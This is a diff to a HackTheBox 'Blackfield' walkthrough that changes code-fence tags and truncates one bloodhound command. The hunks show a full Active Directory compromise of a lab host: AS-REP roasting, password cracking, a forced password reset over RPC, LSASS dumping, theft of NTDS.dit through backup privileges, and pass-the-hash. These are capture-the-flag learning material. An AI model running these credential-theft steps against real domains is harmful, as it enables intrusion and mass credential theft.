@@ -2,7 +2,7 @@
 
 Nmap Scan:
 
-```bash
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.192
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-24 10:13 EDT
@@ -40,7 +40,7 @@ Nmap done: 1 IP address (1 host up) scanned in 71.51 seconds
 
 Nmap All port scan:
 
-```bash
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ nmap -p- --min-rate 10000 -oA nmap/allports 10.10.10.192 -Pn
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-24 10:21 EDT
@@ -63,7 +63,7 @@ Nmap done: 1 IP address (1 host up) scanned in 26.64 seconds
 
 Nmap All ports detailed scan:
 
-```bash
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ sudo nmap -sC -sV -O -p 53,88,135,389,445,593,3268,5985 10.10.10.192 -oA nmap/allports-detailed 10.10.10.192
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-24 10:23 EDT
@@ -139,7 +139,7 @@ Nmap done: 2 IP addresses (2 hosts up) scanned in 120.99 seconds
 
 Rust Scan:
 
-```bash
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ rustscan -a 10.10.10.192 --range 1-65535 -- -A -sC -Pn 
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
@@ -185,7 +185,7 @@ Initiating Connect Scan at 10:25
 
 Enumerating `SMB` service using `crackmapexec`:
 
-```bash
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ crackmapexec smb 10.10.10.192            
 SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
@@ -229,7 +229,7 @@ SMB         10.10.10.192    445    DC01             [-] Error enumerating shares
 
 Using `smbmap`:
 
-```bash
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ smbmap -H 10.10.10.192 -u null
 
@@ -263,7 +263,7 @@ With no creds, I can read the `profiles$` & `forensic` share.
 
 Now, I’ll try listing the contents of the `profile$` share using `smbclient`:
 
-```bash
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ smbclient -N //10.10.10.192/profiles$
 Try "help" to get a list of possible commands.
@@ -294,7 +294,7 @@ There are ton of directories inside the `profiles$` share and each one of them a
 
 On the `forensic` share, I was not able to do anything:
 
-```bash
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ smbclient -N //10.10.10.192/forensic 
 Try "help" to get a list of possible commands.
@@ -310,7 +310,7 @@ I’ll leave this behind and move on to enumerating `LDAP`.
 
 Enumerating `LDAP` service using `ldapsearch`:
 
-```bash
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ ldapsearch -H ldap://10.10.10.192 -x -s base namingcontexts
 # extended LDIF
@@ -340,7 +340,7 @@ result: 0 Success
 
 `DomainDnsZones.blackfield.local` and `ForestDnsZones.blackfield.local` seem like interesting subdomains. Interestingly, they both resolve over `dig` as well (only one shown):
 
-```bash
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ dig @10.10.10.192 ForestDnsZones.BLACKFIELD.local
 
@@ -370,7 +370,7 @@ ForestDnsZones.BLACKFIELD.local. 600 IN A       10.10.10.192
 
 Unfortunately , I can’t get `LDAP` to give me any more information:
 
-```bash
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ ldapsearch -H ldap://10.10.10.192 -x -b "DC=BLACKFIELD,DC=local"
 # extended LDIF
@@ -393,7 +393,7 @@ text: 000004DC: LdapErr: DSID-0C090A69, comment: In order to perform this opera
 
 Enumerating `RPC` using `rpcclient`:
 
-```bash
+```
                                                                                                                                                                                                                                                             
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ rpcclient 10.10.10.192                                
@@ -421,7 +421,7 @@ I was able to access the `RPC` service using NULL authentication, however, my ac
 
 Now that I was able to get NULL access to `SMB` and `RPC`, I’ll run `enum4linux` to help me in the enumeration process:
 
-```bash
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ enum4linux 10.10.10.192 -a
 
@@ -532,7 +532,7 @@ So, now that I have done everything there might be to enumerate, I’ll go back 
 
 I’ll mount the share on my local box (just hitting enter when prompted for a password):
 
-```bash
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ sudo mount -t cifs '//10.10.10.192/profiles$' /mnt         
 [sudo] password for darshan: 
@@ -542,7 +542,7 @@ Password for root@//10.10.10.192/profiles$:
 
 I’ll save these usernames to a file:
 
-```bash
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ cd /mnt                  
                                                                                                                                                                                                                                                             
@@ -576,7 +576,7 @@ Version: v1.0.3 (9dad6e1) - 04/27/24 - Ronnie Flathers @ropnop
 
 Now that I have the valid usernames, I’ll seperate these valid usernames using the following commands:
 
-```bash
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ cat kerbrute-username.out | awk '{print $7}'
 
@@ -595,7 +595,7 @@ svc_backup@blackfield.local
 
 Now that I dont want the `@blacfield.local`, I’ll use another `awk` command to print just the username:
 
-```bash
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ grep VALID kerbrute-username.out | awk '{print $7}' | awk -F\@ '{print $1}'
 audit2020
@@ -605,14 +605,14 @@ svc_backup
 
 I’ll then pipe these usernames to a file:
 
-```bash
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ grep VALID kerbrute-username.out | awk '{print $7}' | awk -F\@ '{print $1}' > kerbrute-username.txt 
 ```
 
 I’ll also output one more format as the `domain username` using the following command:
 
-```bash
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ grep VALID kerbrute-username.out | awk '{print $7}' | awk -F\@ '{print $2"\\"$1}' > kerbrute-domain-username.txt
                                                                                                                                                                                                                                                             
@@ -625,7 +625,7 @@ blackfield.local\svc_backup
 
 Now that I have the usernames and the domain users, Ill do a `Kerberos pre-authentication` check to find out if any user has the `Kerberos Pre Authentication check disabled` using Impacket’s `GetNPUsers`:
 
-```python
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ GetNPUsers.py -dc-ip 10.10.10.192 -no-pass -usersfile kerbrute-username.txt blackfield/ 
 /usr/local/bin/GetNPUsers.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
@@ -641,7 +641,7 @@ And the user `support` has the `pre authentication` check disabled.
 
 Ill copy this `krb5` hash to a file and quickly try to crack the hash with `hashcat`:
 
-```python
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ gedit support-hash.txt
 
@@ -741,7 +741,7 @@ Credentials - `support:#00^BlackKnight`
 
 I quickly checked if these credentials were valid using `crackmapexec` and whether I could get a shell using these credentials:
 
-```python
+```
 ┌──(darshan㉿kali)-[~]
 └─$ crackmapexec smb 10.10.10.192 -u support -p '#00^BlackKnight'
 SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
@@ -759,7 +759,7 @@ So, these creds do work with `smb` but they dont work with `winrm` which means t
 
 Looking at the `smb` shares using the above credentials. It looks like I’ve gained READ ONLY access to the `NETLOGON` and `SYSVOL` shares:
 
-```python
+```
                                                                                                                                                                                                                                                             
 ┌──(darshan㉿kali)-[~]
 └─$ smbmap -H 10.10.10.192 -u support -p '#00^BlackKnight'
@@ -810,14 +810,14 @@ Both the scripts returned similar results, so I could confirm that this is a dea
 
 Moving on, I decided to check out if I could use these credentials for `LDAP`:
 
-```python
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ ldapsearch -H ldap://10.10.10.192 -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' > support_ldap_dump
 ```
 
 The results were over 20-thousand lines long:
 
-```python
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ wc -l support_ldap_dump                                                                                                             
 20362 support_ldap_dump                                                                                                                                                                                                                                                 
@@ -825,7 +825,7 @@ The results were over 20-thousand lines long:
 
 Now, I didnt find anything partcularly useful, but I did find the name of the domain controller, `DC01`:
 
-```python
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ cat support_ldap_dump | grep -i "Domain Controller"
 wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,
@@ -848,9 +848,9 @@ rIDSetReferences: CN=RID Set,CN=DC01,OU=Domain Controllers,DC=BLACKFIELD,DC=lo
 
 Now that I know what is  name of the `dc`  for `blackfield.local` , I can run `bloodhound` using `support` user’s credentials:
 
-```python
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
-└─$ bloodhound-python -c All -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192          
+└─$ bloodhound- -c All -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192          
 INFO: Found AD domain: blackfield.local
 INFO: Getting TGT for user
 WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.blackfield.local:88)] [Errno -2] Name or service not known
@@ -889,7 +889,7 @@ INFO: Done in 00M 25S
 
 Importing this data in `Bloodhound` after starting the `Neo4j` console with the following command:
 
-```python
+```
 sudo neo4j console
 ```
 
@@ -899,7 +899,7 @@ I loaded all the files into `Bloodhound`. In the top left, I searched for `suppo
 
 Now, I was unaware of how to abuse this attack vector. On googling about it, I found out that there’s a somewhat famous post by Mubix about [resetting Windows passwords over RPC](https://room362.com/post/2017/reset-ad-user-password-with-linux/). I’ll use the command `setuserinfo2`:
 
-```python
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ rpcclient 10.10.10.192 -U 'support'                     
 Password for [WORKGROUP\support]:
@@ -921,7 +921,7 @@ Now since it returned nothing, I guess the password has been set to `fak3r!!!`.
 
 I’ll try using the same password and see if I can authenticate as the user `audit2020`:
 
-```python
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ crackmapexec smb 10.10.10.192 -u 'audit2020' -p 'fak3r!!!'
 SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
@@ -939,7 +939,7 @@ Similarly as the `support` user, I can access the `smb` shares but not get a she
 
 So, now, I decided to check the `smb` shares once again, to see if I now had access to any of these shares:
 
-```python
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ smbmap -H 10.10.10.192 -u audit2020 -p 'fak3r!!!'
 
@@ -974,7 +974,7 @@ Okay, so I had read access to the `forensics` share with the `audit2020` account
 
 I’ll now try to extract all the files from the `forensics` share (if it is not empty) and check it out:
 
-```python
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ smbclient -U audit2020 //10.10.10.192/forensic 'fak3r!!!'   
 Password for [WORKGROUP\audit2020]:
@@ -1017,7 +1017,7 @@ Although I got an error while downloading the files from `meomory_analysis` dire
 
 Going through the downlaoded files, I  found something interesting:
 
-```python
+```
 ┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/blackfield/commands_output]
 └─$ cat domain_admins.txt 
 ��Group name     Domain Admins
@@ -1037,7 +1037,7 @@ Now, all the other files had network related information which I dont think was 
 
 Now, I went back to check the `memory_analysis` folder which due to some reasons, I was unable to download:
 
-```python
+```
 smb: \> ls memory_analysis\
   .                                   D        0  Thu May 28 16:28:33 2020
   ..                                  D        0  Thu May 28 16:28:33 2020
@@ -1066,7 +1066,7 @@ It had a ton of `zip` files and which intrested me was the `lsass.zip`.
 
 So, I downloaded these files, unzip them to check out the contents in the file:
 
-```python
+```
 ┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/blackfield/memory_analysis]
 └─$ unzip lsass.zip 
 Archive:  lsass.zip
@@ -1083,7 +1083,7 @@ lsass.DMP: Mini
 
 I could move this over to a Windows VM, but there’s a Mimikatz alternative, [pypykatz](https://github.com/skelsec/pypykatz) which will work just fine. I’ll install it with `pip3 install pypykatz`. [This blog](https://en.hackndo.com/remote-lsass-dump-passwords/#linux--windows) has a good section on dumping with `pypykatz` from Linux. It dumps a bunch of information:
 
-```python
+```
 ┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/blackfield/memory_analysis]
 └─$ pypykatz lsa minidump lsass.DMP 
 INFO:pypykatz:Parsing file lsass.DMP
@@ -1153,7 +1153,7 @@ luid 365835
 
 Looking at the output of the file, I found out that there was a login by the username `svc_backup`, other than that there was only one account used for logging in. So I was pretty sure that the next escalation would be to the `svc_backup` account. I was also able to retrieve the `NT` hash of the account. I’ll authenticate these credenntials with `crackmapexec`:
 
-```python
+```
 ┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/blackfield/memory_analysis]
 └─$ crackmapexec smb 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
 SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
@@ -1171,7 +1171,7 @@ WOW! Now unlike other it is possible to get a shell for this user.
 
 I’ll get a shell using `Evil-WinRM`:
 
-```python
+```
 ┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/blackfield/memory_analysis]
 └─$ evil-winrm -i 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'            
                                         
@@ -1188,7 +1188,7 @@ blackfield\svc_backup
 
 Retrieving the `user` flag:
 
-```python
+```
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> cd ..
 *Evil-WinRM* PS C:\Users\svc_backup> cd Desktop
 *Evil-WinRM* PS C:\Users\svc_backup\Desktop> ls
@@ -1208,7 +1208,7 @@ Priv Esc - Enumeration
 
 Checking out the privileges the user account `svc_backup` has:
 
-```python
+```
 *Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /priv
 
 PRIVILEGES INFORMATION
@@ -1227,7 +1227,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 
 `SeBackUpPrivilege` basically allows for full system read. This is because `svc_backup` is in the Backup Operators group:
 
-```python
+```
 *Evil-WinRM* PS C:\Users\svc_backup\Desktop> net user svc_backup
 User name                    svc_backup
 Full Name
@@ -1269,7 +1269,7 @@ reg save hklm\system c:\temp\system
 
 To execute the above commands properly, i first created a `temp` directory in the `C:` drive, and then ran the commands:
 
-```python
+```
 *Evil-WinRM* PS C:\> mkdir temp
 
     Directory: C:\
@@ -1300,7 +1300,7 @@ Mode                LastWriteTime         Length Name
 
 I’ll now download these files on my machine using the `download` command:
 
-```python
+```
 *Evil-WinRM* PS C:\temp> download sam
                                         
 Info: Downloading C:\temp\sam to sam
@@ -1316,7 +1316,7 @@ Evil-WinRM* PS C:\temp>
 
 Checking out if they were downloaded on my system and then checking out what type of files they were:
 
-```python
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ ls        
 ...SNIP...   sam  ...SNIP...    system     ...SNIP...
@@ -1333,7 +1333,7 @@ system: MS Windows registry file, NT/2000 or above
 
 Now, I’ll `[secretsdump.py](http://secretsdump.py)` to extract all the `SAM hashes`:
 
-```python
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ secretsdump.py -sam sam -system system LOCAL
 /usr/local/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
@@ -1352,7 +1352,7 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 
 It dumped the hashes of the `Administrator.` I validate the hash using `crackmapexec`:
 
-```python
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ crackmapexec winrm 10.10.10.192 -u administrator -H 67ef902eae0d740df6257f273de75051 --local-auth
 SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:DC01)
@@ -1388,7 +1388,7 @@ echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
 
 Checking out if the commands were appended in the file perfectly:
 
-```python
+```
 *Evil-WinRM* PS C:\> cd temp
 *Evil-WinRM* PS C:\temp> echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
 *Evil-WinRM* PS C:\temp> echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
@@ -1444,7 +1444,7 @@ The shadow copy was successfully exposed as z:\.
 
 I’ll now move to the `ntds` folder to check if the above commands worked or not:
 
-```python
+```
 *Evil-WinRM* PS C:\temp> cd z:
 *Evil-WinRM* PS z:\> cd windows
 *Evil-WinRM* PS z:\windows> cd ntds
@@ -1486,7 +1486,7 @@ I was able to move into the `ntds` folder was unable to view the contents of the
 
 So, I can now use the `[robocopy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)` command from Microsoft to move the backup `ntds.dit` file to my temp folder:
 
-```python
+```
 *Evil-WinRM* PS z:\windows\ntds> robocopy /b .\ C:\temp NTDS.dit
 
 -------------------------------------------------------------------------------
@@ -1556,7 +1556,7 @@ So, I can now use the `[robocopy](https://learn.microsoft.com/en-us/windows-serv
 
 It shows that it completed the copy and then by checking the temp folder, I was able to confirm that it was copied.
 
-```python
+```
 *Evil-WinRM* PS z:\windows\ntds> ls C:\temp
 
     Directory: C:\temp
@@ -1582,7 +1582,7 @@ The operation completed successfully.
 
 I’ll now download these files using `Evil-WinRM's` `download` command:
 
-```python
+```
 *Evil-WinRM* PS C:\temp> download ntds.dit
                                         
 Info: Downloading C:\temp\ntds.dit to ntds.dit
@@ -1597,7 +1597,7 @@ Info: Download successful!
 
 With both files now on my attacker machine, I used `secretsdump.py` again and successfully dumped all of the hashes in the domain!
 
-```python
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ secretsdump.py -ntds ntds.dit -system system.bak LOCAL > ntds-hashes.txt
                                                                                                                                                                                                                                                             
@@ -1621,7 +1621,7 @@ audit2020:1103:aad3b435b51404eeaad3b435b51404ee:6c9521b1bd19701f1a1e3f87a4480027
 
 Retrieving the `administrator’s` hash:
 
-```python
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ cat ntds-hashes.txt | grep Administrator
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
@@ -1633,13 +1633,13 @@ Administrator:des-cbc-md5:5d25a84ac8c229c1
 
 `Administrator's` Hash:
 
-```python
+```
 Administrator : 184fb5e5178480be64824d4cd53b99ee
 ```
 
 Using `Evil-WinRM` to obtain a shell:
 
-```python
+```
 ┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
 └─$ evil-winrm -i 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
 
@@ -1657,7 +1657,7 @@ blackfield\administrator
 
 Root flag:
 
-```python
+```
 t*Evil-WinRM* PS C:\Users\Administrator\Documents>cd ..
 *Evil-WinRM* PS C:\Users\Administrator> cd Desktop
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
